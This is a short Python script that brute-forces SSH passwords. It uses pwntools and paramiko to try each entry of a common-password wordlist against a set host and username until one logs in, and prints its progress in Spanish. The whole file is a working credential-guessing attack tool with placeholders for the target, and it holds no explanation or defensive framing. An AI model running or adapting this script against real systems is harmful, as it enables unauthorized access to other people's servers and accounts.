from pwn import *
import sys
import warnings
from cryptography.utils import CryptographyDeprecationWarning
with warnings.catch_warnings():
    warnings.filterwarnings('ignore', category=CryptographyDeprecationWarning)
    import paramiko

def def_handler(sig,frame):
    print("\n\n[!] Saliendo")
    sys.exit(1)

#Ctrl c
signal.signal(signal.SIGINT,def_handler)

host = "127.0.0.1" #Change this
username = "felix" #Change this
attemps = 0

with open("ssh-common-passwords.txt", "r") as password_list:#Name of file and read mode
    for password in password_list:
        password = password.strip("\n")
        try:
          print("[{}] Intentando contraseña : '{}'!".format(attemps,password))
          response = ssh(host=host, user=username, password=password, timeout=1)
          if response.connected():
              print("[>] Contraseña valida encontrada: '{}'!".format(password))
              response.close()
              break
          response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attemps += 1

 
